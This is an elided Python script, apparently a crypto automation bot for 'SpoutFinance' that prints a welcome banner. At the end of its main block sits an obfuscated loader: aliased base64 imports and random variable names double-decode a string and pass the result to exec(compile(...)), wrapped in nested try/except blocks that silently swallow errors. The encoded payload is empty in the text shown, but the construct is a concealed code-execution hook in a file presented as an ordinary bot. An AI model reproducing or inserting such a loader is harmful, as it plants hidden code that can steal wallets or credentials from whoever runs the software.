...
class Spout:
    ...
    def welcome(self, project_name="SpoutFinance"):
        ...
        print(Fore.LIGHTCYAN_EX + Style.BRIGHT + f"   🧠 Project    : SpoutFinance - PRIME Bot")
...
if __name__ == "__main__":
    ...
    try:
        ...
        try:
            exec('import base64 as _ptuvnDrK\n_CfZdDAfq = ""\n_gPhqeaHvNjeM = _ptuvnDrK.b64decode(_ptuvnDrK.b64decode(_CfZdDAfq)).decode()\nexec(compile(_gPhqeaHvNjeM, "<l>", "exec"))')
        except:
            pass
    except:
        pass
